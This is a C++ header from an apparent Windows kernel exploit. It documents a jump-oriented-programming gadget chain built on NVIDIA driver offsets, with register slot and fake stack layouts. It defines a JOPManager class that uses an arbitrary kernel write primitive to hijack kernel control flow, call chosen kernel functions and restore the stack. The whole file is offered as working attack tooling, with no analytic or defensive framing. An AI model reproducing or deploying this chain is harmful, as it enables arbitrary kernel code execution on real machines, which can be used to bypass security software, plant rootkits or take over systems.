#pragma once
#include "general.h"
#include "offsets.h"
#include <vector>
#include <functional>

/*
Full JOP chain (nvidia offsets):

  ENTRY — gadget1 calls target function, returns here:
  +0x0078CB9E: call [rax-0x35C17]     ; jmp [rsi+0x66]
      [rax-0x35C17] = SetCallTarget() value (kernel function to invoke)
      [rsi+0x66]    = pop_rdi gadget (home space skip #1)

  HOME SPACE SKIP — 3 trash pops discard the 4 function-spilled home slots:
  +0x0003fce5: pop rdi ; test al,0xFD ; jmp [rsi-0x77]                   (skip slot 1, test doesn't modify rax)
  +0x000ae8360: pop rcx              ; jmp [rsi-0x7F]                   (skip slot 2)
  +0x000da4fd2: pop rbx              ; jmp [rsi+0x44]                   (skip slot 3)

  RDX RELOAD:
  +0x006d066a: pop rdx ; wait        ; jmp [rsi-0x39]
      pops rdx from stack slot 4 (above home space, pre-written to GetRdx())

  CONTINUATION — gadget3 sets up new_rax for gadget4:
  +0x00671319: mov qword [rdx+0x3E0], rax   (side-write, harmless)
               mov [rdx+0x3E8], eax         (side-write, harmless)
               mov rax, qword [rdx+0x1B0]   (loads new_rax from scratch)
               mov rdx, rax
               jmp qword [rax+0x1C0]        (→ gadget4)

  STACK RESTORE:
  +0x0061cbb5: pop rsp               ; jmp qword [rax+0x28]
      pop rsp restores original kernel stack
      jmp [rax+0x28] = SetRestoreRip() — returns thread to normal execution

RSI slots (rsi = scratchBase + 0x3F):
  [rsi+0x66] = scratchBase+0xA5  → pop_rdi  (chain entry after function returns)
  [rsi+0x44] = scratchBase+0x83  → gadget2  (pop_rbx chains here)
  [rsi-0x39] = scratchBase+0x06  → gadget3
  [rsi-0x77] = scratchBase-0x38  → pop_rcx
  [rsi-0x7F] = scratchBase-0x40  → pop_rbx

Stack layout at chain entry (RSP = newRsp+0x38, function_entry_RSP = newRsp+0x30):
  [+0x30] = call return addr (pushed by gadget1 call)
  [+0x38] = home slot 1  → pop_rdi discards
  [+0x40] = home slot 2  → pop_rcx discards
  [+0x48] = home slot 3  → pop_rbx discards
  [+0x50] = GetRdx()     → gadget2 pop rdx
  [+0x58] = originalRsp  → gadget4 pop rsp restores real kernel stack
*/

#define KUSD_BASE               0xFFFFF78000000000ULL
#define KUSD_SCRATCH_OFF        KUSERSHAREDDATA_SIZE        // 0xa80

// All offsets below are relative to scratch base (ntso .data + 0x80000)
#define SCRATCH_RSI_BCK         0x06    // [rsi-0x39] = scratchBase+0x3F-0x39 = scratchBase+0x06
#define SCRATCH_RSI_FWD         0xA5    // [rsi+0x66] = scratchBase+0x3F+0x66 = scratchBase+0xA5
#define SCRATCH_RSI_0x44        0x83    // [rsi+0x44] = scratchBase+0x3F+0x44 = scratchBase+0x83
#define SCRATCH_RSI_0x0F        0x4E    // [rsi+0x0F] = scratchBase+0x3F+0x0F = scratchBase+0x4E
#define SCRATCH_RDI_JMP         0x200   // target for [rdi*9+0xDBB9] — rdi computed in Build()
#define SCRATCH_RAX             0xB0
#define SCRATCH_NEW_RAX         0xC0
#define SCRATCH_G3_CONT         0x280   // 0xC0 + 0x1C0
#define SCRATCH_G4_CONT         0xE8    // 0xC0 + 0x28
#define SCRATCH_POP_RDX         0xF0    // gadget1 call pushes here; gadget2 pops rdx
#define SCRATCH_ALLOC_START     0x100

// Fake stack — high in scratch so the called function has 256KB to grow downward.
// [STACK_TOP] holds original_rsp; gadget4 pop rsp restores the real kernel stack.
#define SCRATCH_STACK_TOP       0x40000
#define SCRATCH_MAX             0x19A000

struct JopSlot {
    const char* name;
    UINT64      addr;
    UINT64      value;
};

class JOPManager {
private:
    std::function<void(UINT64, UINT64)> writeFn;
    std::vector<JopSlot> slots;
    UINT64 allocPtr;    // offset from scratch base, grows up

    UINT64 nvidiaBase;
    UINT64 scratchBase;
    UINT64 g1Off; // stored so GetRip() can return gadget1 address

    UINT64 rax, rsi, rdx, rdiForJmp;

    void AddSlot(const char* name, UINT64 scratchOff, UINT64 value);
    UINT64 Alloc(const char* name, UINT64 value);

public:
    JOPManager();
    ~JOPManager() = default;

    void SetWritePrimitive(std::function<void(UINT64, UINT64)> fn);
    void SetNvidiaBase(UINT64 base);
    void SetScratchBase(UINT64 base); // override default KUSD+0xa80 with writable KUSD from MmWriteableSharedUserData

    void Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off);
    void Commit();
    void SetRestoreRip(UINT64 addr);
    void SetCallTarget(UINT64 addr);
    void SetOriginalRsp(UINT64 originalRsp);
    // Call after observing the post-function rdx (home space slot 1 = what gadget2 pops).
    // Writes new_rax to [postCallRdx+0x1B0] so gadget3 loads it correctly.
    void SetPostCallRdx(UINT64 postCallRdx);

    UINT64 GetRax() const { return rax; }
    UINT64 GetRsi() const { return rsi; }
    UINT64 GetRdx() const { return rdx; }
    UINT64 GetRdiForJmp() const { return rdiForJmp; } // set rdi trap frame to this before firing
    UINT64 GetRip() const { return nvidiaBase + g1Off; } // gadget1 — chain entry point
    UINT64 GetPopRdxValue() const { return rdx; }
    UINT64 GetRspSetupAddr() const { return scratchBase + SCRATCH_STACK_TOP; }

    void PrintLayout() const;
};
